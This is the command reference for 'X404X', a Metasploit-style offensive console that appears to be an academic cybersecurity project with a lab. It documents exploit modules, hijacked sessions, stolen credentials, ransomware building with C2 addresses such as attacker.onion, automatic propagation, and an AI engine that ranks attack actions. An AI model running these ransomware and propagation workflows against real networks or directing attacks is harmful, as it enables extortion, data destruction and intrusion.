# Referencia de la Consola X404X (msfconsole-style)

Consola interactiva lanzada con `./x404x console`. Implementada en `cmd/x404x/console.go` (721 lineas).

La consola presenta un prompt dinamico que cambia segun el contexto:

```
x404x >                        # Sin modulo cargado
x404x(exploit/eternalblue) >   # Con modulo activo
```

---

## Comandos Core

### `help` / `?`

Muestra el menu completo de comandos disponibles organizados por categoria.

**Uso:**
```
x404x > help
x404x > ?
```

**Ejemplo de salida:**
```
Core Commands
==================================================
  help             Show this menu
  exit             Exit console
  version          Show version info

Modules
==================================================
  search <term>    Search modules
  use <module>     Load a module
  ...
```

---

### `banner`

Muestra el banner ASCII art de X404X con informacion de version, modulos disponibles y stack de despacho.

**Uso:**
```
x404x > banner
```

---

### `exit` / `quit`

Finaliza la sesion de consola y termina el proceso.

**Uso:**
```
x404x > exit
x404x > quit
```

**Salida:**
```
[*] Exiting X404X console...
```

---

### `version`

Muestra la version del framework, el runtime de Go y la autoria.

**Uso:**
```
x404x > version
```

**Salida:**
```
X404X v1.0.0 — Go 1.23+ — Rafael Galvez | Cisco NetAcad | TFG Cybersecurity
```

---

## Comandos de Campana

### `campaign`

Lista todas las campanas activas mostrando ID, nombre, estado, fase actual, numero de agentes y porcentaje de progreso.

**Uso:**
```
x404x > campaign
```

**Salida:**
```
Active Campaigns
======================================================================
  abc123  Demo  [running]  phase=lateral  agents=3  progress=45%
  def456  Corp  [paused]   phase=exfil    agents=1  progress=80%
```

---

### `campaign start <name> --target <ip/cidr> --goal <goal>`

Inicia una nueva campana autonoma con un objetivo definido. El orquestador se encarga de gestionar fases, agentes y modulos.

**Uso:**
```
x404x > campaign start --name Operacion1 --target 10.0.0.0/24 --goal full_compromise
```

**Parametros:**
| Parametro | Descripcion |
|-----------|-------------|
| `--name`  | Nombre identificativo de la campana |
| `--target`| IP o rango CIDR objetivo |
| `--goal`  | Objetivo: `full_compromise`, `exfil`, `persistence`, `destruction` |

---

### `campaign status <id>`

Muestra el detalle completo de una campana: fase actual, historial de acciones, agentes asignados, modulos ejecutados y metricas.

**Uso:**
```
x404x > campaign status abc123
```

---

## Comandos de Modulos (patron msfconsole)

### `use <module_name>`

Carga un modulo en el contexto activo. El prompt cambia para reflejar el modulo seleccionado. Muestra descripcion, tipo, CVE, rank y SO compatibles.

**Uso:**
```
x404x > use exploit/eternalblue
```

**Salida:**
```
[+] exploit/eternalblue
    SMB Remote Code Execution via EternalBlue
    Type: exploit | CVE: CVE-2017-0144 | Rank: excellent | OS: windows

    Use 'show options' to set target.
```

---

### `search <term>`

Busca modulos por nombre, CVE, sistema operativo o descripcion. Devuelve tabla con nombre, tipo, CVE, rank y SO.

**Uso:**
```
x404x > search smb
x404x > search CVE-2017
x404x > search windows
```

**Salida:**
```
Matching Modules ("smb"):
==================================================================================
Name                       Type         CVE             Rank        OS
  exploit/eternalblue        exploit      CVE-2017-0144   excellent   windows
  exploit/smbghost           exploit      CVE-2020-0796   great       windows
```

---

### `show options`

Muestra las opciones configurables del modulo actualmente cargado (RHOSTS, RPORT, LHOST, LPORT, etc.) con su valor actual y si son obligatorias.

**Uso:**
```
x404x(exploit/eternalblue) > show options
```

**Salida:**
```
Module: exploit/eternalblue

Name          Value            Required  Description
RHOSTS                         yes       Target host(s)
RPORT         445              yes       Target port
LHOST                          yes       Local host for reverse shell
LPORT         4444             yes       Local port
```

---

### `set <key> <value>`

Establece el valor de una opcion del modulo cargado. Las claves son case-insensitive.

**Uso:**
```
x404x(exploit/eternalblue) > set RHOSTS 10.0.0.10
x404x(exploit/eternalblue) > set LHOST 10.0.0.1
x404x(exploit/eternalblue) > set LPORT 4444
```

**Salida:**
```
[+] RHOSTS => 10.0.0.10
```

---

### `unset <key>`

Elimina el valor de una opcion del modulo, devolviendola a su estado por defecto (vacio).

**Uso:**
```
x404x(exploit/eternalblue) > unset RHOSTS
```

---

### `exploit` / `run`

Ejecuta el modulo cargado con las opciones configuradas. Valida opciones requeridas antes de lanzar. Despacha al bridge Python para ejecucion real.

**Uso:**
```
x404x(exploit/eternalblue) > exploit
x404x(exploit/eternalblue) > run
```

**Salida:**
```
[*] Dispatching exploit/eternalblue => Bridge
[*] Target: 10.0.0.10:445
[+] Session 1 opened (10.0.0.1:4444 -> 10.0.0.10:445)
```

---

### `back`

Descarga el modulo actual del contexto. El prompt vuelve al estado base.

**Uso:**
```
x404x(exploit/eternalblue) > back
x404x >
```

---

### `info <module>`

Muestra informacion detallada de un modulo sin cargarlo: descripcion completa, autor, CVE, referencias, opciones y notas.

**Uso:**
```
x404x > info exploit/eternalblue
```

---

## Comandos de Sesiones

### `sessions`

Lista todas las sesiones activas con ID, IP del target, SO, usuario y estado. Sesiones online se muestran en verde; sesiones muertas en rojo.

**Uso:**
```
x404x > sessions
```

**Salida:**
```
Active Sessions
======================================================================
Id   Target         OS               User                     Status
  1    10.0.0.10      Windows 10       CORP\admin               online
  2    10.0.0.20      Ubuntu 22.04     root                     online
  3    10.0.0.30      Windows Server   NT AUTHORITY\SYSTEM      dead
```

---

### `sessions -i <id>`

Interactua con una sesion activa. Permite ejecutar comandos directamente en el host comprometido. Usa `background` para volver a la consola principal.

**Uso:**
```
x404x > sessions -i 1
[*] Session 1: admin@10.0.0.10 (Windows 10)
[*] Use 'background' to return.
```

---

## Comandos de IA

### `ai <prompt>`

Envia un prompt a Specter AI (motor de inteligencia del framework) para obtener recomendaciones tacticas, analisis de superficie de ataque o decisiones autonomas.

**Uso:**
```
x404x > ai que exploit debo usar contra un Windows Server 2019 con SMB abierto?
x404x > ai analiza los hosts descubiertos y sugiere lateral movement
```

---

### `suggest`

Consulta el motor de decision (Decision Engine) para obtener las 10 mejores acciones posibles rankeadas por probabilidad de exito, impacto y riesgo de deteccion.

**Uso:**
```
x404x > suggest
```

**Salida:**
```
[*] Specter AI — Top 10 Suggested Actions:
  1. [0.95] exploit/eternalblue -> 10.0.0.10 (SMB open, unpatched)
  2. [0.88] lateral/psexec -> 10.0.0.20 (admin creds available)
  3. [0.82] exfil/smb_share -> \\10.0.0.10\C$ (sensitive docs found)
  ...
```

---

## Comandos de Base de Datos

### `db_status`

Muestra el estado de salud de la base de datos interna (SQLite): tablas, registros, agentes conectados y espacio en disco.

**Uso:**
```
x404x > db_status
```

**Salida:**
```
[*] Database: SQLite (/data/x404x.db)
[*] Tables: 12 | Records: 4,521 | Agents: 3
[*] Disk: 14.2 MB
```

---

### `hosts`

Lista todos los hosts descubiertos durante la campana con IP, hostname, sistema operativo, valor estrategico y puertos abiertos.

**Uso:**
```
x404x > hosts
```

**Salida:**
```
Discovered Hosts
======================================================================
IP             Hostname        OS              Value    Ports
10.0.0.10      DC01            Windows Server  high     445,3389,88
10.0.0.20      WEB01           Ubuntu 22.04    medium   80,443,22
10.0.0.30      DB01            CentOS 8        critical 3306,22
```

---

### `services`

Lista todos los servicios descubiertos organizados por host, incluyendo puerto, protocolo, banner y version.

**Uso:**
```
x404x > services
```

---

### `creds`

Lista las credenciales capturadas durante la campana. Las contrasenas se muestran enmascaradas por seguridad.

**Uso:**
```
x404x > creds
```

**Salida:**
```
Captured Credentials
======================================================================
Host           Username        Password        Source
10.0.0.10      admin           ****            mimikatz
10.0.0.10      CORP\svc_sql    ****            kerberoast
10.0.0.20      root            ****            ssh_brute
```

---

### `vulns`

Lista las vulnerabilidades descubiertas con CVE, severidad (CVSS), host afectado y estado de explotacion.

**Uso:**
```
x404x > vulns
```

**Salida:**
```
Discovered Vulnerabilities
======================================================================
Host           CVE              Severity   Status
10.0.0.10      CVE-2017-0144    critical   exploited
10.0.0.10      CVE-2020-0796    high       confirmed
10.0.0.20      CVE-2021-44228   critical   not_exploited
```

---

## Comandos de Laboratorio

### `lab up`

Levanta el entorno de laboratorio Docker con los contenedores victima preconfigurados (redes aisladas, servicios vulnerables).

**Uso:**
```
x404x > lab up
```

---

### `lab down`

Detiene y elimina todos los contenedores del laboratorio Docker.

**Uso:**
```
x404x > lab down
```

---

### `lab status`

Muestra el estado de cada contenedor del laboratorio: nombre, imagen, estado, puertos expuestos y red.

**Uso:**
```
x404x > lab status
```

---

## Comandos de Payload

### `ransomware build --os <os> --c2 <addr>`

Genera un payload de ransomware compilado para el sistema operativo especificado con la direccion C2 embebida.

**Uso:**
```
x404x > ransomware build --os windows --c2 10.0.0.1:8443
x404x > ransomware build --os linux --c2 attacker.onion:443
```

**Parametros:**
| Parametro | Descripcion |
|-----------|-------------|
| `--os`    | Sistema operativo destino: `windows`, `linux`, `macos` |
| `--c2`    | Direccion del servidor C2 (IP:puerto o dominio:puerto) |

---

### `ransomware deploy <victim_ip> --method <method>`

Despliega el payload de ransomware en una victima usando el metodo de transferencia especificado.

**Uso:**
```
x404x > ransomware deploy 10.0.0.10 --method smb
x404x > ransomware deploy 10.0.0.20 --method ssh
x404x > ransomware deploy 10.0.0.30 --method http
```

**Parametros:**
| Parametro  | Descripcion |
|------------|-------------|
| `victim_ip`| IP del host objetivo |
| `--method` | Metodo de despliegue: `smb`, `ssh`, `http` |

---

### `propagate <subnet>`

Escanea la subred indicada, identifica hosts vivos, mapea servicios vulnerables y propaga el payload automaticamente a todos los objetivos accesibles.

**Uso:**
```
x404x > propagate 10.0.0.0/24
x404x > propagate 192.168.1.0/24
```

---

### `listeners add tcp --port <port>`

Anade un listener C2 TCP en el puerto especificado para recibir conexiones reversas de los agentes desplegados.

**Uso:**
```
x404x > listeners add tcp --port 4444
x404x > listeners add tcp --port 8443
```

---

### `webhook enable --slack <url>`

Habilita notificaciones en tiempo real via webhook de Slack. Cada evento relevante (nueva sesion, exfil completado, campana finalizada) genera una alerta.

**Uso:**
```
x404x > webhook enable --slack https://hooks.slack.com/services/YOUR/WEBHOOK/URL
```

---

## Ejemplo de Flujo de Trabajo Completo

El siguiente ejemplo muestra un ataque completo desde reconocimiento hasta propagacion:

```
x404x > campaign start --name Demo --target 10.0.0.0/24
[+] Campaign 'Demo' created. ID: cam_a1b2c3
[*] Orchestrator scanning 10.0.0.0/24...

x404x > search smb
Matching Modules ("smb"):
==================================================================================
Name                       Type         CVE             Rank        OS
  exploit/eternalblue        exploit      CVE-2017-0144   excellent   windows
  exploit/smbghost           exploit      CVE-2020-0796   great       windows

x404x > use exploit/eternalblue
[+] exploit/eternalblue
    SMB Remote Code Execution via EternalBlue
    Type: exploit | CVE: CVE-2017-0144 | Rank: excellent | OS: windows

x404x(exploit/eternalblue) > set RHOSTS 10.0.0.10
[+] RHOSTS => 10.0.0.10

x404x(exploit/eternalblue) > exploit
[*] Dispatching exploit/eternalblue => Bridge
[*] Target: 10.0.0.10:445
[+] Session 1 opened (10.0.0.1:4444 -> 10.0.0.10:445)

x404x > sessions -i 1
[*] Session 1: admin@10.0.0.10 (Windows 10)
[*] Use 'background' to return.

x404x > ransomware build --os windows --c2 10.0.0.1:8443
[+] Payload generated: x404x_agent_win64.exe (128 KB)
[+] C2 callback: 10.0.0.1:8443
[+] Encryption: AES-256-GCM + RSA-4096

x404x > propagate 10.0.0.0/24
[*] Scanning 254 hosts...
[+] 10.0.0.10:445 — EternalBlue (confidence: 0.92)
[+] 10.0.0.15:445 — SMBGhost (confidence: 0.85)
[+] 10.0.0.20:22  — SSH-Brute (confidence: 0.60)
[+] 10.0.0.30:6379 — Redis-NoAuth (confidence: 0.90)
[*] Propagation complete: 4 targets compromised
```

---

## Arquitectura Interna

La consola opera como un dispatcher que conecta:

```
User Input -> Console.dispatch() -> AppState -> Orchestrator -> Agent Pool -> C2 -> Bridge (Python) -> Handlers
```

Cada comando se resuelve en el mismo ciclo REPL:
1. Lee linea del stdin
2. Tokeniza en action + args
3. Despacha al handler Go correspondiente
4. El handler puede invocar al bridge Python via IPC para ejecucion de modulos
5. Resultado se imprime en stdout con colores ANSI

---

## Notas

- Los colores ANSI se usan para diferenciar estados: verde (exito/online), rojo (error/dead), morado (headers), gris (info secundaria).
- El contexto de modulo persiste hasta ejecutar `back` o `exit`.
- Todos los comandos se registran en el audit log via `state.LogAudit()`.
- La consola es thread-safe y soporta operaciones asincronas del orquestador en background.
